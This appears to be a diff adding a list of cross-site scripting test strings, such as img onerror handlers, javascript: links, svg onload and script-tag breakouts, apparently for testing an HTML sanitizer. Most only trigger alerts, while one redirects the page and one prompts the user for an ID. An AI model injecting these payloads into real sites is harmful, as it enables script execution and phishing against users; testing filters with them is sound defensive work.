@@ -1,0 +1,23 @@
+<img src=whatever onerror=alert('Bad case')>
+<img src=whatever onerror="window.location='https://google.com';">
+<img src=whatever onerror=console.log("Error is success")>
+<img src=x onerror="alert('xss')">
+<img src/onerror=prompt('Sorry,&nbsp;an&nbsp;error&nbsp;was&nbsp;occurred.&nbsp;Please,&nbsp;enter&nbsp;your&nbsp;Id&nbsp;to&nbsp;continue')>
+<IMG SRC=JaVaScRiPt:alert(1)>
+<IMG SRC=x onerror=confirm`xss`>
+<a onmouseover="alert('youhou')">Click me!</a>
+<a onmouseover="document.body.style='color:blue;'">Click me!</a>
+<a onmouseover="document.body.style='transform:rotate(180deg);'">Click me!</a>
+<a href="javascript:alert(1)">link</a>
+<script>alert(1)</script>
+"><script>alert(1)</script>
+<svg onload=alert(1)>
+<svg><a xlink:href="javascript:alert(1)">click</a></svg>
+<iframe src="javascript:alert(1)"></iframe>
+<body onload=alert(1)>
+<div style="background-image:url(javascript:alert(1))">x</div>
+<math href="javascript:alert(1)">m</math>
+<details open ontoggle=alert(1)>x</details>
+<input onfocus=alert(1) autofocus>
+<video src onerror=alert(1)>
+&quot;&lt;script&gt;alert(1)&lt;/script&gt;
